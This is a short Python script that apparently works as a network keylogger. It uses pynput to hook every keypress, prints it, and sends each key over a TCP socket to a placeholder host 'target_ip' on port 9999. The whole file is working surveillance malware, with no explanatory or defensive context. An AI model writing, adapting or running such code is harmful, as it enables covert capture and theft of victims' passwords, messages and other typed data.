from pynput import keyboard
import socket

testing = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
testing.connect(("target_ip",9999))


def print_the_key(key):
    print(key)
    testing.send(str(key).encode())

listener = keyboard.Listener(on_press=print_the_key)
listener.start()
listener.join()